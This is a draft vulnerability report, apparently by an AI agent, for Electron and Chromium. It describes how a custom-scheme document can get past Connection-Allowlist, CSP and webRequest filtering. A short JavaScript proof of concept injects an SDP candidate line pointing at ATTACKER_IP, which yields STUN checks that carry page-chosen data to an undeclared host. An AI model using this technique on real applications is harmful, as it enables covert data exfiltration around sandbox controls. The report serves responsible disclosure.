# Upstream report draft — Electron: `Connection-Allowlist` does not stop remote-ICE-candidate connectivity checks on custom-scheme documents

Status: draft, for the lane reviewer to post. This file is a report to file against Electron (and Chromium where the bug lives). It is not an issue in this repo.

## Summary

Electron 45.2.3 (Chromium 156.0.8078.80) exposes a per-document header `Connection-Allowlist` that is meant to restrict what a frame may connect to. When a document served from a privileged custom scheme (`clover-plugin:`) carries `Connection-Allowlist`, Blink drops every ICE server from the WebRTC configuration and skips `addIceCandidate`, and the network service refuses to resolve unlisted hosts. That works for STUN, TURN and DNS prefetch.

It does **not** stop ICE connectivity checks that the page triggers through a remote description. A page can construct an `RTCPeerConnection` with no ICE servers, write an arbitrary `a=candidate` line into a remote answer's SDP, and `setRemoteDescription` it. Chromium's native WebRTC layer then sends STUN binding requests (connectivity checks) to whatever address the page wrote, from the frame's P2P sockets, carrying a username fragment the page also wrote. This is a one-way channel a plugin can aim at any address it did not declare, with the full `Connection-Allowlist`, CSP and `webRequest` stack enabled. It reproduces on macOS, Windows and Ubuntu.

The same mechanism has a second, fail-closed symptom: in frames whose host was set up under the restricted parent, the first such check is a bad Mojo message (`No binder found for interface network.mojom.MdnsResponder`) and Chromium kills the whole render process. Upstream commit `46fcf3faed` ("Enforce WebRTC blocking in binders via no-op impls") turns those kills into no-ops, but it is not in 156.0.8078.80, and on the evidence it does not close the directly-mounted document, which still binds P2P sockets and sends the checks.

## Expected vs actual

- **Expected:** with `Connection-Allowlist` set, a document reaches only the response-origin it declares. WebRTC sockets bound for that document should not send anything to an unlisted address.
- **Actual:** a directly mounted `clover-plugin:` document, and a sandboxed srcdoc inside it, send 10–15 STUN checks per run to an address the page named only in a remote descriptor, on all three OSes. The browser binds P2P sockets for those documents (12 in the netlog) instead of giving them no-op interfaces.

## Versions

- Electron 45.2.3; Chromium 156.0.8078.80; Node 24.22.2.
- Reproduced on macOS 15 arm64, Windows Server 2025 x64, and Ubuntu 24.04 x64 (under xvfb).
- Upstream Chromium reference: `46fcf3faed` (2026-10-08), not present in this Chromium.

<details>
<summary>Minimal reproduction</summary>

Register a privileged custom scheme, then serve one plugin document over it with `Connection-Allowlist: ("https://allowed.example/*" response-origin)` and a CSP that lists only that origin. From the page, run:

```js
const pc = new RTCPeerConnection(); // no iceServers
pc.createDataChannel("x");
const offer = await pc.createOffer();
await pc.setLocalDescription(offer);
const sdp = offer.sdp.replace(/a=setup:actpass/g, "a=setup:active")
  + `a=candidate:1 1 udp 2122260223 ${ATTACKER_IP} ${ATTACKER_PORT} typ host\r\n`;
await pc.setRemoteDescription({ type: "answer", sdp });
```

`ATTACKER_IP:ATTACKER_PORT` is any reachable UDP listener. That listener receives STUN binding requests (magic cookie `0x2112a442`) whose username fragment is whatever the page wrote into the descriptor — despite `Connection-Allowlist`, the CSP, and a `webRequest` filter that cancels every request whose `initiatorOrigin` is not the declared origin. The same probe from a document whose frame stayed in a restricted parent's process instead kills the renderer with `No binder found for interface network.mojom.MdnsResponder`.

The checks are attributed to the page, not an ICE server: with no `iceServers` configured, gathering produces only host candidates and no STUN/TURN round-trip leaves the process, so the only packets to `ATTACKER_IP` are the connectivity checks themselves.

</details>

This report was written by an AI agent on the reporter's behalf.